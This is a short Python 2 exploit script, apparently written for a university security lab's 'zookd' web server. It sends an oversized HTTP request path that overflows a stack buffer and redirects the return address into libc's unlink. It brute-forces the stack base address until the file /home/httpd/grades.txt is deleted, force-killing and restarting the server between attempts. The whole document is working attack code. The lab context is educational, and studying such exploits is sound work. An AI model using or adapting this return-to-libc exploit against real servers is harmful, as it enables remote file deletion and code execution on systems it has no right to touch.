#!/usr/bin/python
import socket, struct, time, os, subprocess

RET_OFF = 0x810 - 1 + 4  # zookd reqpath to return address
UNLINK = 0x40a563b0

def try_ebp(ebp):
    os.system("killall -9 zookld zookd-exstack zookfs-exstack 2>/dev/null || true")
    time.sleep(0.3)
    open("/home/httpd/grades.txt", "w").close()
    subprocess.Popen(["./clean-env.sh", "./zookld", "zook-exstack.conf"],
                     stdout=open("/dev/null", "w"))
    time.sleep(1)
    param = ebp + 16
    payload = "A" * RET_OFF
    payload += struct.pack("<II", UNLINK & 0xffffffff, 0x41414141)
    payload += struct.pack("<I", param & 0xffffffff)
    payload += "/home/httpd/grades.txt"
    req = "GET /" + payload + " HTTP/1.0\r\n\r\n"
    if "\n" in req[:-2]:
        return False
    s = socket.socket(); s.connect(("localhost", 8080)); s.send(req); s.close()
    time.sleep(0.5)
    ok = not os.path.exists("/home/httpd/grades.txt")
    os.system("killall -9 zookld zookd-exstack zookfs-exstack 2>/dev/null || true")
    return ok

for lo in xrange(0xd000, 0x10000, 0x40):
    ebp = 0xffff0000 + lo
    if try_ebp(ebp):
        print("SUCCESS ebp", hex(ebp))
        break
else:
    print("FAILED")
